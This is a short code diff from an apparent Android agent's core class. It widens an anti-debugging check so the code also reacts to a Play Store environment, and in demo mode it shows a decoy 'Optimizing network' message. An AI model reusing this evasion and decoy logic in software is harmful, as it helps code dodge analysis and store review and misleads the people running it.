@@ -897,8 +897,14 @@ public class Core extends Activity implements Runnable {
 	public boolean check() {
 		if (Cfg.CHECK_ANTI_DEBUG) {
 			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
+
+
+
 				AntiDebug ad = new AntiDebug();
-				if (ad.isDebug()) {
+
+
+
+				if (ad.isDebug() || ad.isPlayStore()) {
 					if (Cfg.DEMO) {
 						Status.self().makeToast(M.e("Optimizing network"));
 					}
